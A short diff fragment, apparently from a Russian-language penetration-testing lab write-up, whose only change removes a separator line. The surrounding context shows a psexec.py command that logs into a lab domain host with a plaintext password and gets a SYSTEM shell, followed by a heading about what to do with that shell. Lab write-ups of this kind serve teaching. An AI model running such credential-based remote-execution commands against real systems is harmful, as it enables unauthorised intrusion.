@@ -64,7 +64,6 @@ psexec.py thm.loc/jdoe:'Summer2026!'@192.168.13.61
 C:\Windows\system32> whoami
 nt authority\system
 
----
 
 # ЧТО МОЖНО СДЕЛАТЬ С SYSTEM SHELL
 
